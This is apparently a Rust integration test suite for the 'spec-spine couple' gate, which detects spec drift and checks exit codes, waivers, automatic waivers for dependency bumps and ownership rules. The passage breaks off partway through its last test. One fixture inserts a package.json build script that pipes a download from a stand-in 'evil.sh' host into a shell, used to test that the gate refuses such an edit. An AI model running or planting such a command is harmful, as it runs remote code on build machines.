//! `spec-spine couple` end-to-end exit-code contract (spec 005):
//! drift → 1, cleared / waived → 0, stale index → 2. Uses `--paths-from` for the
//! deterministic core, plus one real `git diff` path.

use std::fs;
use std::path::Path;
use std::process::Command;

fn bin() -> Command {
    Command::new(env!("CARGO_BIN_EXE_spec-spine"))
}

fn code(out: &std::process::Output) -> i32 {
    out.status.code().unwrap_or(-1)
}

fn write(root: &Path, rel: &str, content: &str) {
    let p = root.join(rel);
    fs::create_dir_all(p.parent().unwrap()).unwrap();
    fs::write(p, content).unwrap();
}

/// A minimal governed repo: one crate owned (manifest + file unit) by spec 001-a.
fn setup(root: &Path) {
    write(root, "Cargo.toml", "[workspace]\nmembers = [\"crate-a\"]\n");
    write(
        root,
        "crate-a/Cargo.toml",
        "[package]\nname = \"crate-a\"\nversion = \"0.1.0\"\n\
         [package.metadata.spec-spine]\nspec = \"001-a\"\n",
    );
    write(root, "crate-a/src/lib.rs", "pub fn a() {}\n");
    write(
        root,
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/lib.rs\"\n---\n# 001-a\n## body\n",
    );
}

/// Compile + index so `couple`'s freshness guard passes against committed inputs.
fn refresh(root: &Path) {
    assert_eq!(
        code(
            &bin()
                .arg("--repo")
                .arg(root)
                .arg("compile")
                .output()
                .unwrap()
        ),
        0
    );
    assert_eq!(
        code(&bin().arg("--repo").arg(root).arg("index").output().unwrap()),
        0
    );
}

fn couple_paths(root: &Path, paths: &[&str], extra: &[&str]) -> std::process::Output {
    write(root, "changed.txt", &format!("{}\n", paths.join("\n")));
    let mut cmd = bin();
    cmd.arg("--repo")
        .arg(root)
        .arg("couple")
        .arg("--paths-from")
        .arg(root.join("changed.txt"));
    cmd.args(extra);
    cmd.output().unwrap()
}

#[test]
fn drift_then_cleared() {
    let tmp = tempfile::tempdir().unwrap();
    setup(tmp.path());
    refresh(tmp.path());

    // Changed an owned path, did not edit its spec → drift (exit 1).
    let drift = couple_paths(tmp.path(), &["crate-a/src/lib.rs"], &[]);
    assert_eq!(
        code(&drift),
        1,
        "{}",
        String::from_utf8_lossy(&drift.stderr)
    );

    // Same change + the owning spec.md → cleared (exit 0).
    let cleared = couple_paths(
        tmp.path(),
        &["crate-a/src/lib.rs", "specs/001-a/spec.md"],
        &[],
    );
    assert_eq!(code(&cleared), 0);
}

#[test]
fn waiver_clears_exit() {
    let tmp = tempfile::tempdir().unwrap();
    setup(tmp.path());
    refresh(tmp.path());
    write(
        tmp.path(),
        "pr-body.txt",
        "rolling forward\nSpec-Drift-Waiver: hotfix OPS-9\n",
    );
    let out = couple_paths(
        tmp.path(),
        &["crate-a/src/lib.rs"],
        &[
            "--pr-body",
            tmp.path().join("pr-body.txt").to_str().unwrap(),
        ],
    );
    assert_eq!(code(&out), 0, "{}", String::from_utf8_lossy(&out.stderr));
    assert!(String::from_utf8_lossy(&out.stdout).contains("waived"));
}

#[test]
fn stale_index_exits_2() {
    let tmp = tempfile::tempdir().unwrap();
    setup(tmp.path());
    refresh(tmp.path());
    // Mutate a hashed input (the spec) without re-indexing → stale.
    write(
        tmp.path(),
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: draft\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/lib.rs\"\n---\n# 001-a\n## body\n",
    );
    let out = couple_paths(tmp.path(), &["crate-a/src/lib.rs"], &[]);
    assert_eq!(code(&out), 2, "stale index must exit 2");
}

#[test]
fn real_git_diff_detects_drift() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup(root);

    let git = |args: &[&str]| {
        let out = Command::new("git")
            .arg("-C")
            .arg(root)
            .args(args)
            .env("GIT_AUTHOR_NAME", "t")
            .env("GIT_AUTHOR_EMAIL", "t@t")
            .env("GIT_COMMITTER_NAME", "t")
            .env("GIT_COMMITTER_EMAIL", "t@t")
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "git {args:?}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    };

    git(&["init", "-q"]);
    refresh(root);
    git(&["add", "-A"]);
    git(&["commit", "-q", "-m", "base"]);

    // Change an owned file; refresh + commit at head.
    write(root, "crate-a/src/lib.rs", "pub fn a() {}\npub fn b() {}\n");
    refresh(root);
    git(&["add", "-A"]);
    git(&["commit", "-q", "-m", "head"]);

    let drift = bin()
        .arg("--repo")
        .arg(root)
        .args(["couple", "--base", "HEAD~1", "--head", "HEAD"])
        .output()
        .unwrap();
    assert_eq!(
        code(&drift),
        1,
        "git-diff drift: {}",
        String::from_utf8_lossy(&drift.stderr)
    );
}

// ===== spec 004 §3.5 + spec 005 §3.5: the dependabot-class path =====

/// A minimal governed repo with an npm package claimed by spec 001-a.
fn setup_npm(root: &Path, auto_waive: bool) {
    if auto_waive {
        write(
            root,
            "spec-spine.toml",
            "[coupling]\nauto_waive_dependency_only = true\n",
        );
    }
    write(
        root,
        "package.json",
        "{ \"name\": \"root\", \"workspaces\": [\"pkg-a\"] }\n",
    );
    write(
        root,
        "pkg-a/package.json",
        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
         \"scripts\": { \"build\": \"tsc\" },\n  \
         \"dependencies\": { \"zod\": \"3.22.0\" } }\n",
    );
    write(
        root,
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"pkg-a\"\n---\n# 001-a\n## body\n",
    );
}

fn git_in(root: &Path, args: &[&str]) {
    let out = Command::new("git")
        .arg("-C")
        .arg(root)
        .args(args)
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@t")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t")
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
}

fn index_check(root: &Path) -> std::process::Output {
    bin()
        .arg("--repo")
        .arg(root)
        .args(["index", "check"])
        .output()
        .unwrap()
}

fn couple_git(root: &Path) -> std::process::Output {
    bin()
        .arg("--repo")
        .arg(root)
        .args(["couple", "--base", "HEAD~1", "--head", "HEAD"])
        .output()
        .unwrap()
}

#[test]
fn dependency_bump_stays_fresh_and_auto_waives() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_npm(root, true);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // Dependabot-style: bump a dependency version. No re-index, no spec edit,
    // no PR body.
    write(
        root,
        "pkg-a/package.json",
        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
         \"scripts\": { \"build\": \"tsc\" },\n  \
         \"dependencies\": { \"zod\": \"3.23.1\" } }\n",
    );
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump"]);

    // (a) The committed index is still FRESH: dependency tables are not a
    // governed input (spec 004 §3.5 governance-projection hashing).
    let fresh = index_check(root);
    assert_eq!(
        code(&fresh),
        0,
        "index must stay fresh on a dep-only bump: {}",
        String::from_utf8_lossy(&fresh.stderr)
    );

    // (b) The coupling gate self-waives (spec 005 §3.5).
    let out = couple_git(root);
    assert_eq!(code(&out), 0, "{}", String::from_utf8_lossy(&out.stderr));
    assert!(
        String::from_utf8_lossy(&out.stdout).contains("auto-waived"),
        "stdout: {}",
        String::from_utf8_lossy(&out.stdout)
    );
}

#[test]
fn dependency_bump_without_optin_still_drifts() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_npm(root, false);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);
    write(
        root,
        "pkg-a/package.json",
        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
         \"scripts\": { \"build\": \"tsc\" },\n  \
         \"dependencies\": { \"zod\": \"3.23.1\" } }\n",
    );
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump"]);

    let out = couple_git(root);
    assert_eq!(code(&out), 1, "auto-waiver is opt-in; default must drift");
}

#[test]
fn script_edit_refuses_the_auto_waiver() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_npm(root, true);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);
    // A scripts edit hiding alongside a version bump: not dependency-only.
    write(
        root,
        "pkg-a/package.json",
        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
         \"scripts\": { \"build\": \"tsc && curl evil.sh | sh\" },\n  \
         \"dependencies\": { \"zod\": \"3.23.1\" } }\n",
    );
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump+script"]);

    let out = couple_git(root);
    assert_eq!(
        code(&out),
        1,
        "a non-dependency manifest edit must refuse the auto-waiver: {}",
        String::from_utf8_lossy(&out.stdout)
    );
}

#[test]
fn claimed_floor_path_refuses_the_auto_waiver() {
    // Spec 008 x 005 §3.5 interplay: a dependency-only bump PLUS an edit to a
    // floor path that a spec explicitly claims must NOT be mechanically
    // waived. With a claim-unaware pre-filter the workflow edit would hide
    // behind the floor, every remaining candidate would be a manifest, and
    // the dep-only waiver would excuse the workflow's C-001 -- fail-open.
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_npm(root, true);
    write(root, ".github/workflows/release.yml", "name: release\n");
    write(
        root,
        "specs/002-wf/spec.md",
        "---\nid: \"002-wf\"\ntitle: \"W\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \".github/workflows/release.yml\"\n---\n# 002-wf\n## body\n",
    );
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // The PR: a dep bump AND a workflow edit, index refreshed (the workflow
    // is a hashed input), no spec edit, no PR body.
    write(
        root,
        "pkg-a/package.json",
        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
         \"scripts\": { \"build\": \"tsc\" },\n  \
         \"dependencies\": { \"zod\": \"3.23.1\" } }\n",
    );
    write(
        root,
        ".github/workflows/release.yml",
        "name: release\non: push\n",
    );
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump+workflow"]);

    let out = couple_git(root);
    assert_eq!(
        code(&out),
        1,
        "a claimed floor path must refuse the auto-waiver and drift: {}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("002-wf"),
        "the workflow's owner must be named: {}",
        String::from_utf8_lossy(&out.stderr)
    );
}

// ===== spec 027: cargo + workflow dependabot-class paths =====

/// A minimal governed repo: one cargo crate discovered and floor-owned by spec
/// 001-a via its manifest metadata, with one external dependency to bump.
fn setup_cargo(root: &Path, auto_waive: bool) {
    if auto_waive {
        write(
            root,
            "spec-spine.toml",
            "[coupling]\nauto_waive_dependency_only = true\n",
        );
    }
    write(root, "Cargo.toml", "[workspace]\nmembers = [\"crate-a\"]\n");
    write(
        root,
        "crate-a/Cargo.toml",
        "[package]\nname = \"crate-a\"\nversion = \"0.1.0\"\n\
         [package.metadata.spec-spine]\nspec = \"001-a\"\n\
         [dependencies]\nserde = \"1.0.0\"\n",
    );
    write(root, "crate-a/src/lib.rs", "pub fn a() {}\n");
    write(
        root,
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/lib.rs\"\n---\n# 001-a\n## body\n",
    );
}

#[test]
fn cargo_dependency_bump_stays_fresh_and_auto_waives() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_cargo(root, true);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // Dependabot-style cargo bump: a dependency version only. No re-index, no
    // spec edit, no PR body. The Cargo.toml is floor-owned by 001-a.
    write(
        root,
        "crate-a/Cargo.toml",
        "[package]\nname = \"crate-a\"\nversion = \"0.1.0\"\n\
         [package.metadata.spec-spine]\nspec = \"001-a\"\n\
         [dependencies]\nserde = \"1.0.5\"\n",
    );
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump"]);

    // (a) Still FRESH: the cargo governance projection (spec 004 §3.5, spec 027)
    // strips dependency tables, so a version bump is not a hashed input.
    let fresh = index_check(root);
    assert_eq!(
        code(&fresh),
        0,
        "index must stay fresh on a cargo dep-only bump: {}",
        String::from_utf8_lossy(&fresh.stderr)
    );

    // (b) The coupling gate self-waives (spec 005 §3.5, extended by spec 027).
    let out = couple_git(root);
    assert_eq!(code(&out), 0, "{}", String::from_utf8_lossy(&out.stderr));
    assert!(
        String::from_utf8_lossy(&out.stdout).contains("auto-waived"),
        "stdout: {}",
        String::from_utf8_lossy(&out.stdout)
    );
}

#[test]
fn cargo_feature_edit_without_bump_still_drifts() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_cargo(root, true);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // A feature-set change hiding as a dependency edit: not dependency-only.
    write(
        root,
        "crate-a/Cargo.toml",
        "[package]\nname = \"crate-a\"\nversion = \"0.1.0\"\n\
         [package.metadata.spec-spine]\nspec = \"001-a\"\n\
         [dependencies]\nserde = { version = \"1.0.0\", features = [\"derive\"] }\n",
    );
    refresh(root); // a shape flip may alter nothing the indexer reads; refresh anyway
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "features"]);

    let out = couple_git(root);
    assert_eq!(
        code(&out),
        1,
        "a features edit must refuse the cargo auto-waiver: {}",
        String::from_utf8_lossy(&out.stdout)
    );
}

#[test]
fn workflow_uses_bump_auto_waives() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    // Reuse the cargo repo for a valid, indexable tree, then add a workflow
    // file explicitly claimed by a spec (so it overrides the .github/ floor).
    setup_cargo(root, true);
    write(
        root,
        ".github/workflows/ci.yml",
        "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    \
         steps:\n      - uses: actions/checkout@v4\n      - run: cargo test\n",
    );
    write(
        root,
        "specs/002-ci/spec.md",
        "---\nid: \"002-ci\"\ntitle: \"CI\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \".github/workflows/ci.yml\"\n---\n# 002-ci\n## body\n",
    );
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // Dependabot github-actions bump: the action ref only, no spec edit.
    write(
        root,
        ".github/workflows/ci.yml",
        "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    \
         steps:\n      - uses: actions/checkout@v5\n      - run: cargo test\n",
    );

    // Spec 060 3.4: the bump leaves the index FRESH, with no re-index in
    // between. `.github/workflows/**/*` is a hashed input (spec 058 fixed the
    // default that had made it one in name only), so before 073 this same bump
    // moved the global-inputs scalar and staled every shard in the repository.
    // That is the wall a Dependabot PR met: the bot has no toolchain to
    // re-index, no write path to commit shards, and no way to put a waiver in
    // a body it does not author. Spec 058 3.6 required this test to assert the
    // stale-then-reindex sequence; 073 amends that, and the projection is what
    // makes the assertion below true.
    let fresh = index_check(root);
    assert_eq!(
        code(&fresh),
        0,
        "a `uses:` bump must leave the index fresh: {}",
        String::from_utf8_lossy(&fresh.stderr)
    );

    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump-action"]);

    let out = couple_git(root);
    assert_eq!(code(&out), 0, "{}", String::from_utf8_lossy(&out.stderr));
    assert!(
        String::from_utf8_lossy(&out.stdout).contains("auto-waived"),
        "stdout: {}",
        String::from_utf8_lossy(&out.stdout)
    );
}

/// Spec 060 3.4's companion: the other direction, on the same fixture.
///
/// Without it the suite proves only that the projection is permissive, not
/// that it is correct, which is the shape of assertion spec 058 3.6 was
/// written to end. A `run:` edit is a governed change to a claimed file: it
/// stales the ledger and it refuses the waiver.
#[test]
fn workflow_run_edit_stales_the_index_and_refuses_the_waiver() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_cargo(root, true);
    write(
        root,
        ".github/workflows/ci.yml",
        "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    \
         steps:\n      - uses: actions/checkout@v4\n      - run: cargo test\n",
    );
    write(
        root,
        "specs/002-ci/spec.md",
        "---\nid: \"002-ci\"\ntitle: \"CI\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \".github/workflows/ci.yml\"\n---\n# 002-ci\n## body\n",
    );
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // Not a version bump: the step now runs something else.
    write(
        root,
        ".github/workflows/ci.yml",
        "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    \
         steps:\n      - uses: actions/checkout@v4\n      - run: cargo bench\n",
    );

    let stale = index_check(root);
    assert_eq!(
        code(&stale),
        2,
        "a `run:` edit must stale the index: {}",
        String::from_utf8_lossy(&stale.stderr)
    );

    // Re-index so the refusal below is the coupling gate's, not staleness.
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "run-edit"]);

    let out = couple_git(root);
    assert_eq!(
        code(&out),
        1,
        "a `run:` edit must refuse the auto-waiver: {}",
        String::from_utf8_lossy(&out.stdout)
    );
}

// ===== spec 029: the ownership ratchet, end to end =====

/// A crate with no manifest floor: `src/lib.rs` is claimed by a file unit,
/// anything else under it is unowned. `require_ownership` is on.
fn setup_ratchet(root: &Path) {
    write(root, "Cargo.toml", "[workspace]\nmembers = [\"crate-a\"]\n");
    write(
        root,
        "crate-a/Cargo.toml",
        "[package]\nname = \"crate-a\"\nversion = \"0.1.0\"\n",
    );
    write(root, "crate-a/src/lib.rs", "pub fn a() {}\n");
    write(
        root,
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/lib.rs\"\n---\n# 001-a\n## body\n",
    );
    write(
        root,
        "spec-spine.toml",
        "[coupling]\nrequire_ownership = true\n",
    );
}

#[test]
fn ratchet_refuses_new_unowned_source_and_allows_its_deletion() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_ratchet(root);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // Add an unowned source file: C-002, exit 1, named as such.
    write(root, "crate-a/src/extra.rs", "pub fn extra() {}\n");
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "add unowned"]);
    let refused = couple_git(root);
    let stderr = String::from_utf8_lossy(&refused.stderr);
    assert_eq!(code(&refused), 1, "{stderr}");
    assert!(stderr.contains("1 unclaimed (C-002"), "{stderr}");
    assert!(
        stderr.contains("'crate-a/src/extra.rs' is not claimed by any spec"),
        "{stderr}"
    );

    // A PR-body waiver clears it like any violation.
    write(
        root,
        "pr-body.txt",
        "Spec-Drift-Waiver: vendored drop, spec to follow\n",
    );
    let waived = bin()
        .arg("--repo")
        .arg(root)
        .args(["couple", "--base", "HEAD~1", "--head", "HEAD", "--pr-body"])
        .arg(root.join("pr-body.txt"))
        .output()
        .unwrap();
    assert_eq!(code(&waived), 0);
    assert!(String::from_utf8_lossy(&waived.stdout).contains("waived"));

    // Deleting the unowned file is how coverage goes up: no C-002, exit 0.
    fs::remove_file(root.join("crate-a/src/extra.rs")).unwrap();
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "remove unowned"]);
    let allowed = couple_git(root);
    assert_eq!(
        code(&allowed),
        0,
        "{}",
        String::from_utf8_lossy(&allowed.stderr)
    );

    // And the whole-tree assertion agrees: fully specified again.
    let full = bin()
        .arg("--repo")
        .arg(root)
        .args(["index", "coverage", "--fail-on-untraced"])
        .output()
        .unwrap();
    assert_eq!(code(&full), 0, "{}", String::from_utf8_lossy(&full.stderr));
}

// ── spec 045: the refusal names the crossing ──────────────────────────────

/// [`setup`] plus a second spec that owns a *different* file, so a diff can
/// edit exactly one `spec.md` that owns none of the violating paths: the
/// crossing case §3.3 is about.
fn setup_two_specs(root: &Path) {
    setup(root);
    write(root, "crate-a/src/other.rs", "pub fn other() {}\n");
    write(
        root,
        "specs/002-b/spec.md",
        "---\nid: \"002-b\"\ntitle: \"B\"\nstatus: approved\ncreated: \"2026-09-07\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/other.rs\"\n---\n# 002-b\n## body\n",
    );
}

/// §3.2: a `C-001` report names three doors, and door two is the one that was
/// missing. The corpus's answer to "I legitimately touched somebody else's
/// unit" has always been an `extends` edge in the author's own spec; the gate
/// never said so, and claude-observatory spent four sessions proving the wall.
#[test]
fn footer_names_three_doors_including_extends() {
    let tmp = tempfile::tempdir().unwrap();
    setup(tmp.path());
    refresh(tmp.path());

    let out = couple_paths(tmp.path(), &["crate-a/src/lib.rs"], &[]);
    assert_eq!(code(&out), 1);
    let e = String::from_utf8_lossy(&out.stderr);

    assert!(e.contains("  1. Edit the owning spec's spec.md"), "{e}");
    assert!(e.contains("  2. Declare an `extends` edge"), "{e}");
    assert!(e.contains("  3. Add a 'Spec-Drift-Waiver:"), "{e}");
    // Door two's two load-bearing facts, without which an author still reads
    // the edge as a change to somebody else's spec.
    assert!(e.contains("amends nobody and\n     needs no waiver"), "{e}");
    // And the waiver is named as the human instrument it is, not as a flag.
    assert!(e.contains("needs explicit human approval"), "{e}");
    // Pasteable YAML, not prose: the syntax is the part adopters got wrong.
    assert!(e.contains("extends:"), "{e}");
    assert!(e.contains("nature: additive"), "{e}");
}

/// §3.3: exactly one edited `spec.md` ⇒ the footer names it and emits the
/// concrete block, with the violating path and its owner filled in.
#[test]
fn one_edited_spec_gets_a_concrete_extends_block() {
    let tmp = tempfile::tempdir().unwrap();
    setup_two_specs(tmp.path());
    refresh(tmp.path());

    // 002-b is edited; it owns `other.rs`, not `lib.rs`, so `lib.rs` drifts.
    let out = couple_paths(
        tmp.path(),
        &["crate-a/src/lib.rs", "specs/002-b/spec.md"],
        &[],
    );
    assert_eq!(code(&out), 1, "{}", String::from_utf8_lossy(&out.stderr));
    let e = String::from_utf8_lossy(&out.stderr);

    assert!(
        e.contains("spec 002-b is the only spec.md edited in this diff"),
        "{e}"
    );
    assert!(e.contains("specs/002-b/spec.md"), "{e}");
    assert!(
        e.contains("- { spec: \"001-a\", unit: \"crate-a/src/lib.rs\", nature: additive }"),
        "the block is filled in, not a template: {e}"
    );
    // §3.3: a suggestion, never an instruction, and never a claim that
    // `additive` is a judgement the gate reached about the author's intent.
    assert!(e.contains("A suggestion, not an instruction"), "{e}");
    assert!(e.contains("revert the touch and declare nothing"), "{e}");
}

/// §3.3: zero or two-or-more edited `spec.md` paths fall back to the generic
/// form. Two edited specs is a legitimate shape (an amendment pair) and the
/// gate has no basis for guessing which one should declare the edge.
#[test]
fn two_edited_specs_fall_back_to_the_generic_form() {
    let tmp = tempfile::tempdir().unwrap();
    setup_two_specs(tmp.path());
    refresh(tmp.path());

    // A third spec that owns nothing here, so neither edited spec clears
    // `lib.rs` and two spec.md paths are in the diff.
    write(
        tmp.path(),
        "specs/003-c/spec.md",
        "---\nid: \"003-c\"\ntitle: \"C\"\nstatus: approved\ncreated: \"2026-09-07\"\n\
         summary: \"s\"\nreferences:\n  - { unit: { kind: file, path: \"README.md\" }, role: context }\n\
         ---\n# 003-c\n## body\n",
    );
    write(tmp.path(), "README.md", "# r\n");
    refresh(tmp.path());

    let out = couple_paths(
        tmp.path(),
        &[
            "crate-a/src/lib.rs",
            "specs/002-b/spec.md",
            "specs/003-c/spec.md",
        ],
        &[],
    );
    assert_eq!(code(&out), 1, "{}", String::from_utf8_lossy(&out.stderr));
    let e = String::from_utf8_lossy(&out.stderr);

    assert!(!e.contains("is the only spec.md edited"), "{e}");
    assert!(e.contains("<owning-spec-id>"), "generic shape: {e}");
}

/// §3.2: a report carrying only `C-002` renders the footer it rendered before
/// this spec. Claiming an unowned path is a different act from crossing into
/// somebody else's territory, and the three doors do not describe it.
#[test]
fn c002_only_footer_is_unchanged() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_ratchet(root);
    refresh(root);

    write(root, "crate-a/src/extra.rs", "pub fn extra() {}\n");
    refresh(root);
    let out = couple_paths(root, &["crate-a/src/extra.rs"], &[]);
    assert_eq!(code(&out), 1, "{}", String::from_utf8_lossy(&out.stderr));
    let e = String::from_utf8_lossy(&out.stderr);

    assert!(
        e.contains(
            "Resolve by editing an owning spec's spec.md (C-001), claiming the path \
             in a spec's owning edge (C-002), or add a 'Spec-Drift-Waiver:' line to \
             the PR body."
        ),
        "{e}"
    );
    assert!(!e.contains("  1. Edit the owning spec"), "{e}");
}

/// §3.5: the envelope carries `owners` as data and no guidance prose. Guidance
/// in the envelope would be a third representation of the same list, stale
/// against the prose and useless to the machine that already has the list.
#[test]
fn json_envelope_carries_owners_not_prose() {
    let tmp = tempfile::tempdir().unwrap();
    setup(tmp.path());
    refresh(tmp.path());

    let out = couple_paths(tmp.path(), &["crate-a/src/lib.rs"], &["--json"]);
    assert_eq!(code(&out), 1);
    let v: serde_json::Value =
        serde_json::from_slice(&out.stdout).expect("verdict envelope is JSON");
    let violation = &v["report"]["violations"][0];
    assert_eq!(violation["code"], "C-001");
    assert_eq!(violation["owners"][0], "001-a");

    let text = String::from_utf8_lossy(&out.stdout);
    assert!(!text.contains("Declare an `extends` edge"), "{text}");
    // §3.4: a payload addition does not move the envelope's version (spec 044
    // §3.6). Asserted against the constant rather than a literal, because an
    // additive verb elsewhere legitimately moves it (spec 049 did) and that is
    // not a payload addition.
    assert_eq!(v["schemaVersion"], spec_spine_types::VERDICT_SCHEMA_VERSION);
}

// ── spec 073: a mode-only or binary change is a change ───────────────────

/// Bytes git's content sniffing classifies as binary (a NUL in the first
/// block), so `git diff` prints `Binary files ... differ` and no `+++` header.
const BINARY_A: &[u8] = b"\x89PNG\0\0\0\x0dIHDR\x01\x02";
const BINARY_B: &[u8] = b"\x89PNG\0\0\0\x0dIHDR\x03\x04";

/// Commit everything: `refresh` first so the committed index is fresh, then
/// stage, then apply any staged-only mode flips, which `git add -A` would
/// otherwise reset from the working tree (and which the filesystem cannot carry
/// portably).
fn commit_all(root: &Path, msg: &str, chmod_x: &[&str]) {
    refresh(root);
    git_in(root, &["add", "-A"]);
    for path in chmod_x {
        git_in(root, &["update-index", "--chmod=+x", path]);
    }
    git_in(root, &["commit", "-q", "-m", msg]);
}

fn couple_git_json(root: &Path) -> serde_json::Value {
    let out = bin()
        .arg("--repo")
        .arg(root)
        .args(["couple", "--base", "HEAD~1", "--head", "HEAD", "--json"])
        .output()
        .unwrap();
    serde_json::from_slice(&out.stdout).unwrap_or_else(|e| {
        panic!(
            "couple --json is JSON ({e}): {}",
            String::from_utf8_lossy(&out.stderr)
        )
    })
}

fn violation_codes(v: &serde_json::Value) -> Vec<String> {
    v["report"]["violations"]
        .as_array()
        .unwrap()
        .iter()
        .map(|x| x["code"].as_str().unwrap().to_string())
        .collect()
}

/// §3.7 case 1: `chmod +x` on a claimed path, owning spec untouched, is C-001.
#[test]
fn mode_only_change_to_a_claimed_path_is_drift() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_ratchet(root);
    git_in(root, &["init", "-q"]);
    commit_all(root, "base", &[]);
    commit_all(root, "chmod", &["crate-a/src/lib.rs"]);

    let out = couple_git(root);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert_eq!(code(&out), 1, "a mode flip must be judged: {stderr}");
    assert!(stderr.contains("C-001"), "{stderr}");
    assert!(stderr.contains("crate-a/src/lib.rs"), "{stderr}");
    assert!(stderr.contains("001-a"), "{stderr}");
}

/// §3.7 case 2: a binary content change to a claimed path is C-001.
#[test]
fn binary_change_to_a_claimed_path_is_drift() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_ratchet(root);
    write(
        root,
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/lib.rs\"\n  - \"crate-a/assets/logo.png\"\n\
         ---\n# 001-a\n## body\n",
    );
    fs::create_dir_all(root.join("crate-a/assets")).unwrap();
    fs::write(root.join("crate-a/assets/logo.png"), BINARY_A).unwrap();
    git_in(root, &["init", "-q"]);
    commit_all(root, "base", &[]);

